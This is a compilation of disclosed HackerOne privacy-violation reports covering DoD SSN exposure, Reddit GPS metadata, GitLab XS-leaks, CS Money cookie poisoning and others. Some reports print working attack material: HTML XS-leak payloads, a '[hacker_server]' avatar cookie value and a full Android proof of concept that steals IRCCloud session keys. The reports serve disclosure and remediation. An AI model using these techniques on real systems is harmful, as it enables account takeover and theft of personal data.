# Privacy Violation

_15 reports — High/Critical, disclosed_

### [██████ SSN/EDPI](https://hackerone.com/reports/1541817)

- **Report ID:** `1541817`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @badlifeguard
- **Bounty:** - usd
- **Disclosed:** 2024-10-25T15:21:07.736Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
With some simple URL manipulation, an authenticated user is able to request other soldiers SSN, perID, EDPI. 

## References
CWE-200 - Information Disclosure
CWE-284 - Improper Access Control
Collaborators: 
theonetruepengu
hxhbrofessor

## Impact

After pulling an perID, someone would have access to view their  SSN, EDPI. With most recent breaches of SSNs, one attacker would have enough information to verify and impersonate another soldier for malicious purposes.

## System Host(s)
████, ██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Authenticate to https://████████/#/soldierRecord/
Run your browsers developer mode.
Then look for the network request:"listReviews?perId=######"

https://███████/svc/reviewController/listReviews?perId=######

If you load that page with random numbers you will be able to see all soldier PII. If the soldier associated to the perID is no longer in the Army, the information is Null.

[{"perId":3643051,"ssn":"XXXXXXXXX","edipi":"XXXXXXXXXX","soldierName":"HRABAK X X","type":"P","typeFull":"PERSONNEL RECORDS REVIEW","mode":null,"createDt":1642087763000,"status":"C","statusFull":"COMPLETE","statusDt":1645994091000,"dueDt":1677530091000,"domId":"AV","error":"N","soldierAbsence":null,"soldierAbsenceRemark":null,"reviewer":978715,"reviewerSignDt":1645994091000,"reviewerRemark":null,"soldierSignDt":1645994016000,"soldierRemark":null,"permMissingDocs":null,"tempMissingDocs":null,"emailList":null,"lockDt":null,"reviewFolder":null,"method":"I","documents":null,"cases":null,"lesPresent":false,"srbPresent":false,"lesVerified":true,"srbVerified":true,"prevSignDate":1645994016000,"inProgress":false,"reviewerComplete":false,"soldierComplete":true,"supportingDocsVerified":true,"reviewerSigned":true,"soldierSigned":true}]

## Suggested Mitigation/Remediation Actions
Correct permissions on access to these URLs. Authenticated users should be checked against their own ID and data.

---

### [The Deleted Polls is Still Accessable after 30 Days](https://hackerone.com/reports/1015373)

- **Report ID:** `1015373`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** X / xAI
- **Reporter:** @eissen5c
- **Bounty:** 560 usd
- **Disclosed:** 2023-02-13T16:42:28.502Z
- **CVE(s):** -

**Summary (team):**

The researcher demonstrated a vulnerability that makes it possible for Twitter users to access a Poll after it has been deleted by user that originally posted the Poll. Though it was not visible or accessible via the user interface, it could still be accessed for an extended period of time beyond what the Twitter policy states. This behavior made it possible to compromise the privacy of the user's account that originally posted the Poll if the content was not deleted within a specified amount of time.

---

### [GPS metadata preserved when converting HEIF to PNG](https://hackerone.com/reports/1069039)

- **Report ID:** `1069039`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** Reddit
- **Reporter:** @ianonavy
- **Bounty:** - usd
- **Disclosed:** 2021-10-21T19:57:10.465Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Users who upload HEIC/HEIF files (sometimes called "Live Photos")  to reddit.com or old.reddit.com expect their GPS metadata to be stripped before being displayed publicly. Uploaded HEIC files are converted to PNG, but GPS metadata is incorrectly preserved, in violation of user privacy. The problem is likely device- and browser-agnostic, and mostly affects Safari users on Mac since other devices and browsers either automatically convert to a different format or do not permit HEIC files to be uploaded through the usual user flow.

## Impact:
All users who have submitted HEIC files have their GPS locations exposed publicly, which can be scraped with little detection and no authorization.

## Steps To Reproduce:

1. Take a Live photo on an iPhone 11 Pro with GPS location tagging enabled
2. Sync the photo to iCloud Photos
3. Upload HEIF/HEIC file to Reddit.com via Safari on macOS Big Sur (Example F1138749)
4. Submit post to any community
5. Visit the post and click the link to get to the https://i.redd.it/FILENAME.png file
6. Download the file

## Supporting Material/References:

Expected behavior is no GPS metadata, but you can see that **the metadata is present in these examples**:
* https://i.redd.it/s7vjzg05w6861.png (Safari)
* https://i.redd.it/6wnf9cf637861.png (Safari)
* https://i.redd.it/d1zqv32297861.png (Safari)
* https://i.redd.it/8ytwrr5re7861.png (IE)

{F1138750}

I was also able to reproduce this flow through Internet Explorer on Windows 10 (but not Edge), which means the issue is **likely device- and browser-agnostic.**

However, when I tested the following flows, I found that **GPS metadata was correctly removed for**:
* Reddit iOS app on iPhone
* Safari on iPad (local testing shows iOS converts it to a JPEG before uploading)

For some tests, **I wasn't able to upload HEIC photos at all**:

* Chrome and Firefox on Mac (HEIC not supported by image/* MIME filter on accept attribute)
* Chrome, Firefox, and Edge on Windows (Windows does not recognize HEIC as an image file)
* Safari on iPhone (no option to upload photos on mobile view)
* Safari on Mac after having changed the file extension from .HEIC to .PNG (not actually changing the file otherwise)

It seems likely that **only Safari for Mac and Internet Explorer** allow HEIC files to be uploaded directly to Reddit. All other methods I've tried seem to result in normal metadata scrubbing.

**I was able to find location data for at least one other user in the wild:** https://i.redd.it/1hn2uafmwu661.png ([post](https://www.reddit.com/r/BotanicalPorn/comments/kil6om/prunus_mume_buds_encased_in_ice_oc/)). Downloading this image, I can see their GPS location:

{F1138751}

**I originally discovered this when spot-checking an image** that I uploaded yesterday. The post can be found [here](https://www.reddit.com/r/flying/comments/kmm32s/i_made_a_checklist_for_my_car_can_you_tell_it_was/), and the image was [here](https://i.redd.it/5oe2cj40q6861.png). I have since deleted the image.

## Impact

All users who have submitted HEIC files have their GPS locations exposed publicly, which can be scraped with little detection and no authorization.

---

### [Responsible Disclosure of Privacy Leakage Issue](https://hackerone.com/reports/1089914)

- **Report ID:** `1089914`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** GitLab
- **Reporter:** @mzaheri
- **Bounty:** - usd
- **Disclosed:** 2021-06-29T06:31:08.419Z
- **CVE(s):** -

**Vulnerability Information:**

Greetings,

I am Mojtaba Zaheri, a doctoral candidate in Computer Science, affiliated with the [NJIT Cybersecurity Research Center](https://centers.njit.edu/cybersecurity/welcome/). Together with my doctoral dissertation advisor, Prof. Reza Curtmola, we are reaching out to perform responsible disclosure of a vulnerability present on the GitLab website. Please let us know if you have any comments regarding this disclosure.

### Summary:
We have identified a leaky resource attack against several high-profile resource-sharing websites, including GitLab, that allows an attacker to infer the unique identity of a victim that visits an attacker-controlled website. This targeted privacy attack can have a significant impact on the privacy of individuals.

Even though previous work introduced the attack using images (i.e., leaky images [1]), in this report we show that the attack works with any resource that can be privately shared with the victim and can be rendered on a webpage. In particular, we show the attack also works with other media files, such as video and audio files. Thus, we generically refer to the attack as a leaky resource attack. An attacker exploiting these vulnerabilities can identify a user of the GitLab website while the user visits an attacker-controlled website, using the cookie(s) set by the GitLab website in her browser.

The leaky image attack [1] leverages the existence of a state-dependent URL (SD-URL) on the image-sharing website, i.e. a URL for which the response is different depending on the victim’s state with respect to the image-sharing website. For example, if the user is the targeted victim, the content will be loaded, otherwise, it will not be loaded. The attacker can learn information about this response based on an XS-leak that bypasses the Same-Origin Policy which normally prevents the attacker from reading the contents of a cross-origin response. [1] describes script-based and scriptless variants of the leaky image attack. The scriptless variant relies on the object HTML tag for the XS-leak, using this tag’s if-then-else behavior to enable the attack.

We reveal a new SD-URL for resources in the GitLab service and introduce two new HTML-only XS-Leaks. We show that a leaky resource attack can be performed using video and audio HTML tags. The previously known scriptless attack was based on the object HTML tag, but we find that it is not reliable: It does not work against all vulnerable resource-sharing services and only works in some browsers. As opposed to this, we show that attacks based on the video and audio tags are very reliable, as they work against all the vulnerable services we identified and across all browsers we tested with (Firefox, Edge, Chrome).

We describe below the threat model, the exploit vector, and the actual steps that need to be followed on your website to set up a leaky resource attack. We also explain potential fixes.

### Threat Model:
We consider attackers that can bring together the following necessary ingredients for a successful leaky resource attack:
1. The attacker and the victim are users of the same resource sharing service.
2. The resource sharing service allows its users to share resources privately with each other and authenticates users through cookies.
3. The attacker convinces the victim to visit the attack page (which is controlled by the attacker) while the victim is logged into her account with the resource sharing service (which is not controlled by the attacker).
4. The attacker can determine if the victim loaded the resources successfully.

The attack is effective because these requirements can be achieved in multiple ways and are within easy reach of the attacker. For requirement #1, GitLab is popular, so the victim may have an account; also, GitLab has free membership, and so the attacker can just create an account. For requirement #2, these are the de facto mechanisms for many of the resource sharing services. Requirement #3 can be achieved in multiple ways, including via phishing emails, or via a watering-hole approach. It is common for a large portion of internet users to be logged in to GitLab when they are surfing the internet. Requirement #4 is crucial for the attack and can be achieved as follows. The attack page contains a state-dependent URL (SD-URL) that points to content on the target website (i.e., GitLab). When a user makes a request for the SD-URL, the response is different depending on the user's state with respect to the GitLab website. For example, if the user is the targeted victim, the content will be loaded, otherwise, it will not be loaded. The attacker can learn information about this response based on an XS-leak that bypasses the Same-Origin Policy which normally prevents the attacker from reading the contents of a cross-origin response.

### Attacks:
The new SD-URL we use can be exploited by a script-based XL-leak, but here we focus on scriptless XS-leaks, as privacy-aware users may disable scripts or use protection mechanisms that prevent script-based XS-leaks.

The pattern of the SD-URL used is:
```
https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}
```
This SD-URL is valid until the resource is unshared or deleted.

Exploiting this SD-URL based on object tag HTML-only XS-Leak from [1]:
```
<object data ="https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}" type ="image/png">
             <object data ="Fallback-URL" type ="image/png"></object>
</object>
```
Communication method using the object HTML tag: If the outer object element (SD-URL) fails to load, then the fallback is to load the inner object element (Fallback-URL, controlled by the attacker). This fallback-based mechanism can be used to simulate an if-then-else control flow instruction in pure HTML. The attack does not work with browsers we tested (Chrome 87.0, Edge 87.0, and Firefox 83.0).

Here we describe the video and audio HTML tags as new XS-leaks that are reliable across all browsers we tested (Chrome 87.0, Edge 87.0, and Firefox 83.0).
```
<video width="320" height="240" controls autoplay muted>
        <source src="https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}" type ="video/webm">
        <source src="Fallback-URL" type ="video/webm">
</video>
```
Communication Method using video HTML tag: If the first source (SD-URL) cannot be loaded, then the fallback is to load the second source (Fallback-URL, controlled by the attacker).
```
<audio width="320" height="240" controls autoplay>
         <source src="https://gitlab.com/{userName}/{repoName}/-/raw/{branchName}/{fileName}" type ="audio/ogg">
         <source src="Fallback-URL" type ="audio/ogg">
</audio>
```
Communication Method using audio HTML tag: If the first source (SD-URL) cannot be loaded, then the fallback is to load the second source (Fallback-URL, controlled by the attacker).

Normally, the source elements are used by website authors to specify multiple alternative media resources for media elements. However, these alternatives can be used to trigger a fallback behavior that mimics an if-then-else control flow. Both resources used in these tests have the type webm and ogg for video and audio tags respectively, but other video and audio file types can be used as well. By checking the HTTP Request Headers, the attacker can make sure whether the specific file type is supported by the browser, and so prepare an appropriate webpage.

### Steps to Reproduce:
The attacker first shares privately a resource with the target victim using a sharing service. The attacker then embeds a link to the privately shared resource on a webpage she controls. When a visitor loads that webpage, the resource will be successfully retrieved only if the visitor is the targeted victim, since only the victim is allowed to retrieve the resource (assuming the victim's browser is logged into the sharing service). By observing the success of loading the resource through an XS-leak, the attacker will know if the intended victim has visited the attacker's website.

1) Upload and share privately the resource with the victim in GitLab.
2) Open the resource in the browser to get the SD-URL.
3) Embed the SD-URL in an attacker-controlled webpage with an XS-leak.

### Fix:
1.       Server-side defense:
The SameSite cookie attribute can be used to impose restrictions when cookies can be sent. Although setting this cookie attribute to strict or lax could limit the attack surface in theory, our findings show that many popular sharing services are still vulnerable, because the attribute is either set to none or not enabled at all. A major reason for this is that the SameSite cookie attribute interferes with services provided by websites. Two examples are a watch later button on a YouTube video embedded in a non-YouTube website, and a website that embeds the GoogleMaps service, in order to show user-specific resources, such as saved and favorite locations on the map. As an additional drawback, when the SameSite attribute is not set, browsers have inconsistent default behaviors. Chromium-based browsers versions 80 and above treat cookies as if a lax SameSite attribute is set, whereas Firefox (tested up to version 83) treats them as if SameSite is set to none.

2.       Client-side defense:
We have devised a client-side defense that can be implemented as a browser extension and can thus be deployed immediately without buy-in from websites and browser vendors. The defense is included in a research article that is currently under submission for publication at an academic conference.

### References:
[1] Staicu, C.A., Pradel, M.: Leaky images: Targeted privacy attacks in the web. In: Proc. of the 28th USENIX Security Symposium. pp. 923-939 (2019)

## Impact

The leaky resource attack is a targeted privacy attack, in which an individual browsing an attacker-controlled webpage can be uniquely identified. This is in contrast with other known de-anonymization techniques, such as third-party tracking (e.g., tracking pixels or tracking IPs) or social media fingerprinting, that do not provide this level of accuracy. As such, leaky resources can be abused in a variety of privacy-sensitive scenarios, including law enforcement gathering evidence regarding the online activity of individuals, oppressive governments tracking political dissidents, de-anonymizing reviewers for a conference paper, blackmailing individuals based on their online activity, or health insurance companies discriminating individuals based on their online activity.

---

### [Cookie poisoning leads to DOS and Privacy Violation](https://hackerone.com/reports/1067809)

- **Report ID:** `1067809`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** CS Money
- **Reporter:** @benjamin-mauss
- **Bounty:** 700 usd
- **Disclosed:** 2021-02-25T09:44:37.897Z
- **CVE(s):** -

**Summary (team):**

Summary, submitted by `████████` requires no additions by us and fully expresses impact and reasons behind the vulnerability.

**Summary (researcher):**

# Summary
By change the value of the cookie avatar, a hacker could not only get information of the support agent IP address, but also disconnect all the supports without interaction.

## Vulnerability

The cookie avatar should have the value of a link to the user's steam avatar.
A normal cookie is like that: `https://steamcdn-a.akamaihd.net/steamcommunity/public/images/avatars/ae/ae6680902f4fe18e692ba9ea250bd694b34ad417_medium.jpg`

But in the server, there is a verification like that (pseudocode):
````
bool valid_url = false;
if(cookies["avatar"].contains("https://steamcdn-a.akamaihd.net/steamcommunity/")){
    valid_url = true;
}else{
    valid_url = false;
}
```
Now start a chat with a support by sending a message.

Ok, so what if we insert the url, but after the hacker server?

### Privacy Violation (IP Address exposed)
`[hacker_server]/?https://steamcdn-a.akamaihd.net/steamcommunity/`
The server accept it and, when the support receive a message from the hacker, the support browser will try to load the url of the hacker's avatar and send a request to the hacker server. Now the hacker got his IP address.

### DOS (Forced log out)
`https://cs.money/logout?https://steamcdn-a.akamaihd.net/steamcommunity/`
now think. What if instead of the hacker server, we insert the URL of the logout in cs.money?
Bingo!
The support browser will make a request to the logout URL and it will disconnect him.

### Ending

One thing that I noticed is that not only the current support agent that we are talking, but all the online supports will try to load my avatar cookie.

Ok, now think in the first vulnerability, that is the `Privacy Violation`. The impact is that a hacker could get privacy information of the support and use this for phishing.

What about the second one? I think I don't even need to say the impact, but anyway: 
The impact is that a hacker could set the support function of the website offline: without supports agents there is no support :)
How much days would take to the devs know that this is a security problem, find it and fix it?

I am glad I can help.
#### If would like to contact me, don't hesitate to send a message to ████████#3684 (message, not friend request XD)

---

### [Improper Access Controls Allow PII Leak via ████](https://hackerone.com/reports/819591)

- **Report ID:** `819591`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @z32
- **Bounty:** - usd
- **Disclosed:** 2021-02-18T19:01:07.337Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Dashboards in `██████████` allow a user to add widgets and obtain large amounts of information to include PII and diagnostic information. Additionally, a user is able to make changes to certain catalogs via these widgets.

**Description:**

## Impact
An adversary can gain access to PII to include full names, e-mail addresses, physical addresses, phone numbers, etc., as well as modifying fields within the underlying system. Additionally, the adversary could identify information such as the number/type of incidents, as well as diagnostic information such as memory usage.

## Step-by-step Reproduction Instructions

1. Create an account on `███████/` and browse to `███████` once your account has been verified. 
██████
2. If this is your first time accessing this page, you will need to create a dashboard.
██████
3. Using the `Add Widgets` feature, an adversary can gain access to various information as shown in the picture below. This is just a small glimpse of what an adversary has access to through this panel.
████
4. Clicking on the `All(22)` text in the third widget above, an adversary can access various configuration items.
██████████
5. These can then be modified by the adversary as shown below:
████
6. If an adversary browses to `███/home`, they get a slightly different interface:
████
7. By clicking `Add Content` in the top left corner, the adversary can add widgets similar to before. This dashboard seems to contain a little more functionality..
████████
8. By adding `███████`, the adversary can access PII of many of the users of the website.
█████
█████
9. The `███` account shown below does not contain much sensitive information, but the fields for the other accounts are highly populated. The ████████ account was used instead in effort to prevent showing real user information.
████████

## Suggested Mitigation/Remediation Actions
Restrict access to these widgets to only those users that need this functionality. Regular users should not have access to this data, especially when the account creation process is so easy.

## Impact

An adversary can gain access to PII to include full names, e-mail addresses, physical addresses, phone numbers, etc., as well as modifying fields within the underlying system. Additionally, the adversary could identify information such as the number/type of incidents, as well as diagnostic information such as memory usage.

---

### [CRITICAL Insecure Direct Object Reference (I.D.O.R) - Link Other User's Credit Card ](https://hackerone.com/reports/358143)

- **Report ID:** `358143`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** Yelp
- **Reporter:** @hk755a
- **Bounty:** - usd
- **Disclosed:** 2020-08-19T01:26:50.910Z
- **CVE(s):** -

**Summary (team):**

@hk755a discovered an Insecure Direct Object Reference Vulnerability that allowed an attacker to associate a randomly added (but subsequently deregistered) credit card with their own account, via the `/rewards/signup` endpoint. While the attacker would not have been able to use this credit card as their own (nor view any primary account numbers (PAN) for said cards), the attacker may have been able to glean the transaction history associated with the card, as well as cash back amounts received.

Yelp was able to quickly validate and fix the vulnerability within two days. Thanks to @hk755a for working with us to fix this bug!

---

### [Connection informaton is sent to a third-party service](https://hackerone.com/reports/752402)

- **Report ID:** `752402`
- **Severity:** Critical
- **Weakness:** Privacy Violation
- **Program:** Nord Security
- **Reporter:** @martinbydefault
- **Bounty:** - usd
- **Disclosed:** 2020-02-23T20:00:26.745Z
- **CVE(s):** -

**Summary (team):**

Application event data exposed through the reuse of API key
The researcher reported that iOS app usage event information sent to the third party service can be intercepted through the reuse of API key. In order to resolve the issue we have disabled GET requests for API keys, removed the third party SDK and per DPA terms deleted all event data that has ever been sent.

---

### [Gateway information leakage](https://hackerone.com/reports/258410)

- **Report ID:** `258410`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hackerfactor
- **Bounty:** - usd
- **Disclosed:** 2019-07-30T14:42:04.222Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
Many DoD systems use BlueCoat gateways. These gateways insert unique BlueCoat ids that permit tracking DoD users and gaining insight into the DoD network architecture when DoD users access the Internet.

**Description:**
I run a popular web service (FotoForensics.com -- it's around 150,000 in the Alexa list of top web sites).  My public web site is explicitly for research and gets visitors from all over, including from the DoD.  One of the research project collects non-standard HTTP headers.  The BlueCoat HTTP headers immediately stood out as non-standard.

Someone with a BlueCoat gateway will have headers that look like:

> POST /upload-file.php HTTP/1.1
> Host: www.fotoforensics.com
> Content-Length: 70869
> Cache-Control: max-age=0
> Origin: http://www.fotoforensics.com
> Upgrade-Insecure-Requests: 1
> User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
> Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPaSgeQQ5m6kh7aaZ
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
> Referer: http://www.fotoforensics.com/
> Accept-Language: en-█████████,en;q=0.8
> ██████████: ██████ (███) SC
> Connection: Keep-Alive
> █████████: █████████

(This example came from a user at the United States Patent and Trademark Office.)

The id found on the "██████████" line is unique to the Bluecoat device; it is not unique to the user. However, if this ID ever shows up at a different network address, then it permits a remote (outside of DoD) system to identify associated network addresses, multiple proxy exits, and potentially non-attributable networks. Similarly, if a single IP address is associated with multiple Bluecoat ids, then it denotes a single exit proxy and identifies the (minimum) number of subnets that use the proxy.

For example:

> █████████
> ██████
> ██████████
> █████████
> ████████
> ██████
> ██████████

My server has seen this one IP address associated with 7 different Bluecoat devices.

> ███
> ████
> █████████
> ██████████

This single bluecoat ID has been linked to four different network addresses.

> ███
> ████████

This bluecoat id (████) is interesting because it has been seen on two very different subnets.

> █████████
> ███

This bluecoat ID moved locations: it was seen in████ and in/near ███████. (Imagine what it could tell an observer if it were to suddenly appear in █████████...)

I have currently collected 243 bluecoat IDs associated with "████████". In addition, I've collected 120 bluecoat IDs from the █████████ Group, 71 ids from the "Headquarters, ██████████AISC", and ids from many other government organizations.

For example:
> ██████
> ███
> █████
> █████
> █████

This one bluecoat id has been observed with both the Department of the Interior and with ██████████GS. The first 3 ip addresses have hostnames that say "usgs.gov", but the others either lack hostnames or are from the national parks service (nps.gov). And this one id is from 5 IP addresses that span 4 different subnets.

## Impact
DoD uses Bluecoat gateways with unique IDs enabled. The unique IDs are supposed to prevent proxy forwarding loops between Bluecoat devices. However, they permit external observers from (1) determining that a Bluecoat device is in use, (2) tracking the device, and (3) gaining insight into the DoD network architecture.

When combined with user-agent strings and other distinct and unique identifiers, this combination of ID and IP address permits determining who likely works with whom.

(Let me know if you want the full list for DoD bluecoat devices. And if you want them for other ██████ Gov/Mil groups, let me know.)

## Suggested Mitigation/Remediation Actions
It varies by Bluecoat device, but buried in each system's configuration menu is an option to disable the unique ID. These should be disabled everywhere.

---

### [Privacy violation для аттачей в сообщениях.](https://hackerone.com/reports/377115)

- **Report ID:** `377115`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** ok.ru
- **Reporter:** @iframe
- **Bounty:** - usd
- **Disclosed:** 2018-08-21T22:14:46.960Z
- **CVE(s):** -

**Summary (team):**

The vulnerability allowed unauthorized access to other users' file attachments with no ability to identify senders or recipients.

Уязвимость позволяла получить несанкционированный доступ к приаттаченным файлам без возможности определить отправителя и получателя.

**Summary (researcher):**

Vulnerability allowed downloading other people's files from private messages.
Уязвимость позволяла скачивать чужие файлы из личных сообщений без возможности определить отправителя и получателя.

---

### [Physical Laptop Takeover](https://hackerone.com/reports/393615)

- **Report ID:** `393615`
- **Severity:** Critical
- **Weakness:** Privacy Violation
- **Program:** Ed
- **Reporter:** @h1_analyst_everton
- **Bounty:** - usd
- **Disclosed:** 2018-08-12T08:19:12.741Z
- **CVE(s):** -

**Vulnerability Information:**

At 6:16PM of August 11th of 2018, during H1-702, right before the sand storm beat the shit out of the rooftop party, we managed to perform a critical attack on Ed's infrastructure.
{F332214}

## Report Summary

During our analysis and reconnaissance of how Ed program worked during the h1-702 event, we realized there was a critical flaw on how the program was setup. 

## Report Description

During the process, we realized that the program manager had tendency to leave secrets open in the wild. While analyzing this, we decided to look into hardware hacking. So as we looked around, we found that the owner of the program left their computer open. What was worse is that it allowed us to to use this to exploit this and get root access into multiple services. 

{F332215}

After we had access to the laptop, we decided to start the first exploiting for PoC by taking a screenshot of our team. This helps to prove that we could do anything we wanted.

## Impact

Access to internal documentations, Ed program statistics and internal details.

##MOST IMPORTANT IMPACT

Shame Ed on the company Slack

{F332216}

**_The Triage send their regards!_**

---

### [Получение чужого номера телефона (все цифры) через форму восстановления пароля](https://hackerone.com/reports/350939)

- **Report ID:** `350939`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** VK.com
- **Reporter:** @namthar
- **Bounty:** - usd
- **Disclosed:** 2018-06-30T21:13:46.073Z
- **CVE(s):** -

**Summary (team):**

В некоторых случаях можно было получить привязанный к странице номер телефона.

**Summary (researcher):**

Данная уязвимость позволяет злоумышленнику получить личный номер телефона жертвы, который привязан к странице Вконтакте. Для использования данной уязвимости достаточно знать только электронный адрес жертвы.

---

### [[IRCCloud Android] Theft of arbitrary files leading to token leakage](https://hackerone.com/reports/288955)

- **Report ID:** `288955`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** IRCCloud
- **Reporter:** @bagipro
- **Bounty:** - usd
- **Disclosed:** 2017-11-15T15:23:32.609Z
- **CVE(s):** -

**Vulnerability Information:**

#Bug description#

Hi, I'd like to report a vulnerability which allows to theft arbitrary protected files (and as a result takeover account, because all tokens will be leaked), similar to my bug reported to Harvest https://hackerone.com/reports/161710

This one is really tricky, passed two days to realize how to exploit that ;)

Activity ``` com.irccloud.android.activity.ShareChooserActivity ``` is exported and designed to allow file sharing from third-party apps to IRC Cloud
```xml
        <activity android:excludeFromRecents="true" android:name="com.irccloud.android.activity.ShareChooserActivity" android:theme="@style/dawnDialog">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.SEND"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data android:mimeType="application/*"/>
                <data android:mimeType="audio/*"/>
                <data android:mimeType="image/*"/>
                <data android:mimeType="text/*"/>
                <data android:mimeType="video/*"/>
            </intent-filter>
            <meta-data android:name="android.service.chooser.chooser_target_service" android:value=".ConversationChooserTargetService"/>
        </activity>
```

```java
    protected void onResume() {
        //...
        if (getSharedPreferences("prefs", 0).getString("session_key", "").length() > 0) {
            	//...
                this.mUri = (Uri) getIntent().getParcelableExtra("android.intent.extra.STREAM"); // getting attacker provided uri
                if (this.mUri != null) {
                    this.mUri = MainActivity.makeTempCopy(this.mUri, this); // copying file from this uri to /data/data/com.irccloud.android/cache/
                }
```

```java
    public static Uri makeTempCopy(Uri fileUri, Context context, String original_filename) { // original_filename = mUri.getLastPathSegment()
        //...
        try {
            Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));
            Log.d("IRCCloud", "Copying file to " + out);
            InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);
            OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);
            byte[] buffer = new byte[8192];
            while (true) {
                int len = is.read(buffer);
                if (len != -1) {
                    os.write(buffer, 0, len);
                //...
```

It means that the specified file will be copied to ``` /data/data/com.irccloud.android/cache/ ``` with original name. Original name is ``` getLastPathSegment() ``` from the specified uri. But there is one thing: this method decodes last path segment. This is my PoC:
```java
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // path to sdcard (encoded relative path from "/data/data/com.irccloud.android/cache/")
        String zhk = "..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml";
        // absolute path to a file, pointing to sumlink
        String appDir = "/data/data/" + getPackageName();
        String deepPath = appDir + "/x/x/x/x/";

        new File(deepPath).mkdirs();

        String sumlink = deepPath + zhk;
        try {
            File sumlinkFile = new File(Uri.decode(sumlink)).getCanonicalFile();
            sumlinkFile.getParentFile().mkdirs();

            Runtime.getRuntime().exec("ln -s /data/data/com.irccloud.android/shared_prefs/prefs.xml "
                    + sumlinkFile.getAbsolutePath()).waitFor();
        }
        catch(Exception e) {
            // should be never thrown
            throw new RuntimeException(e);
        }
        grant777PermissionToEverything(new File(appDir));

        Uri uri = Uri.parse("file://" + sumlink); // file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml

        Intent intent = new Intent();
        intent.setClassName("com.irccloud.android", "com.irccloud.android.activity.ShareChooserActivity");
        intent.putExtra("android.intent.extra.STREAM", uri);
        startActivity(intent);
    }

    private void grant777PermissionToEverything(File dist) {
        dist.setReadable(true, false);
        dist.setWritable(true, false);
        dist.setExecutable(true, false);
        if(dist.isDirectory()) {
            for(File child : dist.listFiles()) {
                grant777PermissionToEverything(child);
            }
        }
    }
```

Result:
{F238129}
{F238128}

It works so:
1) I start your activity with the following uri: ``` file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml ```
2) Canonical file from #2 (``` /data/data/com.attacker/sdcard/prefs.xml ```) is a symlink file pointing to the file I want to theft (``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ```)
3) In your app ``` original_filename ``` is equal to ``` ../../../../sdcard/prefs.xml ```
4) 
```java
InputStream is = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openInputStream(fileUri);
```

But ``` openInputStream(...) ``` automatically decodes the specified uri. So it will access my symlink file which points to ``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ```
5) 
```java
Uri out = Uri.fromFile(new File(context.getCacheDir(), original_filename));
OutputStream os = IRCCloudApplication.getInstance().getApplicationContext().getContentResolver().openOutputStream(out);
```
It is equal to 
```java
Uri out = Uri.fromFile(new File("/data/data/com.irccloud.android/cache/", "../../../../sdcard/prefs.xml"));
```

So it simply outputs the specified file to Sd card.

#How to fix#
Just specify e.g. current timestamp as a file name, but don't use provided by attacker. In current implementation attacker can force IRC Cloud app to copy arbitrary files to arbitrary directories. File ``` /data/data/com.irccloud.android/shared_prefs/prefs.xml ``` contains ``` session_key ```. In normal situation this file is accessible only to IRC Cloud app. But when it's copied to e.g. Sd card it will be accessible to everyone. But Sd card is only simple example. Attacker can also force IRC Cloud app to copy a file to its internal directory.

BTW this vulnerability also allows to overwrite arbitrary files. So attacker also can replace any your protected files and substitute for example history.

---

### [application/x-brave-tab should not be readable.](https://hackerone.com/reports/258578)

- **Report ID:** `258578`
- **Severity:** High
- **Weakness:** Privacy Violation
- **Program:** Brave Software
- **Reporter:** @qab
- **Bounty:** 250 usd
- **Disclosed:** 2017-11-07T22:20:27.250Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

It is possible to read a dragged tab object if user is coerced into drag and dropping it into attacker controlled page. This is bad because tab history is mentioned within the object, thus information leaks are possible through a trick.

## Products affected: 

 
Brave: 0.18.14 
rev: ad92d029e184c4cff01b2e9f4916725ba675e3c8 
Muon: 4.3.6 
libchromiumcontent: 60.0.3112.78 
V8: 6.0.286.44 
Node.js: 7.9.0 
Update Channel: dev 
OS Platform: Microsoft Windows 
OS Release: 10.0.14393 
OS Architecture: x64

## Steps To Reproduce:

1. Open PoC and click on button.
2. Popup should appear loading facebook and then should direct to a dummy page
3. Attempt to drag and drop the newly opened windows tab into the big 'O' under the button. (as if you are trying to move the tab but instead you drop it into the O)
4. We can successfully read 'x-brave-tab' object including history.

As I mentioned before, so much information is available in the output, specifically I want to point to the history section, where we can extract victims facebook name by reading URL after redirect.
